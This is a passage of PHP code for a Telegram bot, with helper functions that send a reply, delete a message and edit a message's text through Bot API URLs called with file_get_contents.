$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};
function delMessage ($chatId, $message_id){
$url = $GLOBALS[website]."/deleteMessage?chat_id=".$chatId."&message_id=".$message_id."";
file_get_contents($url);
};

    function editMessage($chatId, $message, $messageId) {

    $url = $GLOBALS[website]."/editMessageText?chat_id=".$chatId."&message_id=".$messageId."&text=".urlencode($message);
    file_get_contents($url);

    }
?>